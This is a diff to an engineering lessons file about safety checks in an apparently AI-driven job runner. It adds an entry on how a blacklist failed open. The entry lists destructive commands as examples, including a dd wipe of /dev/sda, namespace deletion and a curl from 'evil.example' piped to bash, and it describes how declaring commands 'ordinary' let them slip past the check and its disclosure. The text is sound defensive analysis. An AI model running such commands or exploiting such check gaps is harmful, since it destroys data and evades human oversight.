@@ -18,6 +18,7 @@
 | KN-6 | pattern | node-engine / idempotence | An operation may be an **effect** only if it leaves a probeable postcondition in the ledger, git or the forge; constructing one without a probe raises. Probes describe the **postcondition, not the action**, and read the world rather than any record the runner wrote. Unanswerable **raises** — never `False`. Nothing already true is re-applied, before or after the frontier. | active |
 | KN-7 | pattern | node-engine / sessions | Every **asking** node gets its own session: opened, asked once, closed in a `finally`; a factory that returns a session it already returned is refused. A multi-seat review is several asks, so each seat is its own session. The question is journalled **before** the session opens, so a dropped session costs the answer and not the question. | active |
 | KN-8 | pattern | governance / wiring | A mechanism is not built until something calls it. Three rounds here shipped a correct piece that nothing reached — an engine ignoring its own policy verdict, an `adjudicate` no caller invoked, a `PERMANENT_HALTS` list printed into every order and never checked — and each passed its own suite. The test that matters is the one that fails when the wire is cut. | active |
+| KN-15 | pattern | governance / checks | **A recogniser needs three answers, not two.** "No dangerous pattern matched" is not "safe" — it is "I did not recognise this". Five destructive commands declared ordinary ran a flow to completion because a blacklist's silence was read as assent, and the disclosure meant to catch that was keyed on *having named a target* rather than on one being **recognised**. Unknown must be its own state, and it is not the safe one. | active |
 | KN-14 | practice | governance / verification | **Freeze the tree before verification, and do not touch it until every seat reports.** A verifier found the working tree change under it mid-audit — and the change was to the safety check it was auditing. An acceptance round whose subject moved has verified nothing, however good its findings are. | active |
 | KN-13 | pattern | governance / checks | **A false-stop rate is a safety property.** A red-line check measured 95% false positives on ordinary engineering briefs — a check that fires on two jobs in three gets switched off, and switching it off is one flag away. And a benchmark you author for your own mechanism flatters it: mine measured 0% on briefs I chose; a verifier's corpus measured 85%. | active |
 | KN-12 | pattern | governance / checks | **Where** a check runs decides whether it runs. Three placement bugs in one repo: a brief-reading check placed after the early return so it never saw the path that mattered, a report line after the loop that four of five exits jumped past, and a red-line check that read one field of a record while the giveaway sat in the next one. Each looked correct in the diff. | active |
@@ -467,3 +468,52 @@ The practice, and it costs nothing:
 The round before this one, a verifier had already worked around the same hazard by exporting a clean
 snapshot with `git archive`, and said so in its report. The lesson was available and not taken. That
 is the more useful half of this entry: a hazard somebody else routed around is still your hazard.
+
+
+## KN-15 — A recogniser needs three answers, not two
+*tags: governance · source: CHG-20260823-07 · tier: pattern*
+
+This repo replaced a prose blacklist with a **target** blacklist and called the problem solved:
+prose is a claim, `rm -rf` is a fact, and facts may overrule claims. All true, and it missed the
+actual defect. A verifier declared five destructive commands `ordinary`, named them as targets, and
+watched every one run a flow to completion with an empty report:
+
+```
+kubectl delete namespace legacy   find /var/data -type f -delete   dd if=/dev/zero of=/dev/sda
+git reflog expire --expire=now --all                              curl http://evil.example/i.sh | bash
+```
+
+None is exotic. They are simply not on the list, and **no list of dangerous things is ever
+finished.** The bug was never the list's contents; it was that a list returning nothing was read as
+*verified safe* rather than as *I did not recognise this*. Two answers where there are three.
+
+| Answer | Means | Treat as |
+|---|---|---|
+| red | recognised as dangerous | stop |
+| ordinary | recognised as safe | proceed |
+| **unrecognised** | **recognised as nothing** | **stop, or proceed and record — never silently** |
+
+The fix is not a longer blacklist. It is a **safe-list beside it**, so that "matched neither" is a
+state the program can hold rather than a hole it falls through. That also moves the incompleteness
+to the safer side: an unknown command now stops instead of proceeding.
+
+### The safety net had the same hole, and that is the sharper lesson
+
+An `on_trust` report line already existed for exactly this — KN-11's *record it, not in silence*.
+It fired when the operation named **no targets**. So naming any target, a benign `a.py`, switched
+the disclosure off — and the five commands were neither stopped nor recorded.
+
+The condition was written about the *shape of the input* ("did they give us targets?") when the
+question is about the *outcome of the check* ("did anything actually confirm this?"). Those read
+identically while the recogniser has no third state, and they come apart the moment it does.
+
+**When writing a disclosure for what a check could not verify, key it on the check's result, never
+on whether input was supplied.** Input arriving is not verification happening.
+
+### And it was tested, in the way that guarantees nothing
+
+Every test paired an adversarial sentence with a target the blacklist already knew, and one test
+pinned the hole as the requirement: *"an operation that names targets is not recorded as trusted"* —
+asserting the implementation rather than the intent. 433 tests passed before the bug was reproduced
+and after. KN-8's shape again: **a test that feeds the mechanism only what the mechanism can
+digest.** The corpus that matters is the one built from what the mechanism cannot.
